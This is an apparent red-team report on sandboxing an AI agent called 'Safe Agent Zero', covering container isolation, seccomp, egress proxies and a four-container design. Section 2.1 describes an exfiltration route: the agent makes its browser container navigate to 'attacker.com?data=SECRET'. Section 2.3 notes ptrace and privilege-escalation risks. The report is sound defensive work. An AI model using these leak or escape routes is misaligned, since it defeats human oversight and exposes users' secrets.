# Safe Agent Zero: Consolidated Red Team Report (v1.0)

**Date:** 2026-02-15
**Status:** **PASSED (with Architectural Simplification)**
**Scope:** Rounds 2-8 (Internal Reinforcement Loop)
**Artifacts Reviewed:** Implementation Plan, Defense Strategy, Docker Configs

---

## 1. Executive Summary

The "Safe Agent Zero" architecture has undergone 6 rounds of intensive adversarial review, evolving from a basic container setup to a military-grade isolated environment.

**Key Evolution:**
*   **Round 2 (Baseline):** Added DNS Filtering and `no-new-privileges`.
*   **Round 3 (Hardening):** Added Seccomp profiles blocking dangerous syscalls (`ptrace`, `mount`).
*   **Round 4 (Pen-Test):** Identified "Scout Exfiltration" (browser-based data leak) as a critical flaw. Added Egress Monitoring.
*   **Round 5 (Architecture):** Flagged "Navigation Guard" (CDP interception) as fragile. Replaced with **Network Isolation** for Scout.
*   **Round 8 (Complexity):** Flagged "Sidecar Sprawl" (6 containers). Proposed **MVSA (Minimum Viable Secure Architecture)** consolidating into 4 containers.

**Final Verdict:** The architecture is **SAFE TO BUILD** provided the **MVSA** simplification is adopted to prevent operational collapse.

---

## 2. Critical Findings & Remediations

### 2.1 Scout Exfiltration (The "Achilles Heel")
*   **Finding (Round 4):** Agent controls Scout (Browser) via CDP. Scout needs internet. Agent can instruct Scout to navigate to `attacker.com?data=SECRET`.
*   **Fix (Round 5):** **Scout Network Isolation**.
    *   Scout is DETACHED from the internet.
    *   Scout is attached to a private `browsing-net`.
    *   All traffic flows through a strictly filtered Egress Proxy on `browsing-net`.
    *   Agent cannot "tunnel" through Scout because the proxy enforces the policy.

### 2.2 Sidecar Sprawl (The "Distributed Monolith")
*   **Finding (Round 5/8):** Architecture grew to 6 containers (`agent`, `scout`, `guard`, `coredns`, `squid`, `scout-proxy`). Verification was becoming impossible.
*   **Fix (Round 8):** **Consolidated Security Sidecar**.
    *   Merge `coredns` (DNS) and `squid` (Proxy) into a single `security-sidecar` container.
    *   Reduces container count to 4 (`agent`, `scout`, `guard`, `sidecar`).
    *   Simplifies networking config to a single "Gateway" pattern.

### 2.3 Persistence & Escalation
*   **Finding (Round 3):** Standard Docker containers allow `ptrace` and capability inheritance.
*   **Fix:**
    *   **Seccomp**: Custom `agent-profile.json` blocking 60+ syscalls.
    *   **No New Privileges**: `security_opt: [no-new-privileges:true]`.
    *   **Read-Only Root**: `read_only: true` with strictly scoped mounts.

---

## 3. The Final "MVSA" Architecture

The approved architecture for implementation is the **4-Container MVSA**:

### Container 1: `sanctum-guard` (Nginx)
*   **Role**: Ingress Controller.
*   **Responsibility**: Auth, Rate Limiting, user-facing API.
*   **Networks**: `frontend-net`, `control-net`.

### Container 2: `sanctum-agent` (Node.js)
*   **Role**: The AI Brain.
*   **Security**: Read-Only Root, Seccomp Profile, No Internet (Direct), No DNS (Direct).
*   **Networks**: `control-net` (to Guard/Sidecar), `execution-net` (to Scout/Sidecar).

### Container 3: `sanctum-scout` (Chromium)
*   **Role**: The Hands/Eyes.
*   **Security**: Read-Only Root, Seccomp Profile, No Internet (Direct).
*   **Networks**: `execution-net` (from Agent), `browsing-net` (to Sidecar).

### Container 4: `sanctum-sidecar` (Squid + Dnsmasq)
*   **Role**: The Jailer.
*   **Responsibility**:
    1.  **DNS**: Resolves approved domains for Agent.
    2.  **Agent Proxy**: Whitelisted CONNECT tunnel for API calls.
    3.  **Scout Proxy**: Whitelisted/Logged HTTP/S for browsing.
*   **Networks**: Attached to ALL internal networks (`control-net`, `execution-net`, `browsing-net`) + Host/Internet.

---

## 4. Next Steps

1.  **Freeze Specs**: Update `implementation_plan.md` to match MVSA 4-Container model.
2.  **Implementation**: Proceed to WP-004 (Build).
